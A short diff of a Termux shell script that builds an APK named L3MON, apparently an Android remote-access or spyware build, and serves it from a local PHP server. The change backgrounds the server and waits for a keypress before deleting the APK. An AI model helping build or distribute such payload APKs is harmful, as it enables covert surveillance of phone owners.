@@ -55,8 +55,9 @@ then
 	apktool b "$appPath" -o $PREFIX/share/L3MON/L3MON.apk > /dev/null 2>&1 &
 	printf "${IGreen}    [✔] 𝗔𝗽𝗸 𝗕𝘂𝗶𝗹𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹\n" | pv -qL 30
 	cd $PREFIX/share/L3MON
+	php -S localhost:8080 > /dev/null 2>&1 &
 	termux-open-url http://localhost:8080
-	php -S localhost:8080 > /dev/null 2>&1
+	read -p " Press Enter To Stop" ntg 
 	rm -rf L3MON.apk
 
 
